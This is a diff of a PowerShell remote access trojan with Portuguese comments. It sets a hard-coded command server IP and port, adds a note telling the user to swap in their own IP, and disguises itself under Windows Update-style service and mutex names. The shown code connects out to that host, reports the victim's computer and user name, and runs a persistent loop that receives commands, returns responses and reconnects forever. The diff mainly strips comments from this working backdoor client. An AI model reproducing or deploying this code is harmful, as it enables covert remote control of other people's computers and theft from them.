@@ -8,7 +8,7 @@ Version: 10.0.19045.1
 #>
 
 # ===== CONFIGURACOES =====
-$serverIP = "198.1.195.194"
+$serverIP = "198.1.195.194"  # ⚠️ MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService"
@@ -641,7 +641,7 @@ function Uninstall-RAT {
     }
 }
 
-# ===== CONEXAO PRINCIPAL (CORRIGIDA) =====
+# ===== CONEXAO PRINCIPAL =====
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TcpClient
@@ -658,13 +658,10 @@ while ($true) {
         $reader = New-Object System.IO.StreamReader($stream)
         $writer.AutoFlush = $true
         
-        # Enviar identificação
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
         
-        # Loop de comandos
         while ($true) {
             try {
-                # Verificar se tem dados disponíveis
                 if ($stream.DataAvailable) {
                     $cmd = $reader.ReadLine()
                     
@@ -673,7 +670,6 @@ while ($true) {
                         continue
                     }
                     
-                    # Processar comando
                     $response = ""
                     
                     switch -Wildcard ($cmd) {
@@ -737,45 +733,36 @@ while ($true) {
                         }
                     }
                     
-                    # Enviar resposta
                     if (-not [string]::IsNullOrEmpty($response)) {
                         try {
                             $writer.WriteLine($response)
                         } catch {
-                            # Erro ao enviar, reconectar
                             break
                         }
                     }
                 } else {
-                    # Sem dados, aguardar um pouco
                     Start-Sleep -Milliseconds 100
                 }
                 
-                # Verificar se conexão ainda está ativa
                 if (-not $client.Connected) {
                     break
                 }
                 
             } catch {
-                # Erro no loop, sair para reconectar
                 break
             }
         }
         
     } catch {
-        # Erro de conexão, aguardar antes de tentar novamente
     } finally {
-        # Limpar recursos
         if ($reader) { try { $reader.Close() } catch {} }
         if ($writer) { try { $writer.Close() } catch {} }
         if ($stream) { try { $stream.Close() } catch {} }
         if ($client) { try { $client.Close() } catch {} }
     }
     
-    # Aguardar antes de reconectar
     Start-Sleep -Seconds 5
 }
 
-# Limpar mutex ao sair
 $mutex.ReleaseMutex()
 $mutex.Dispose()
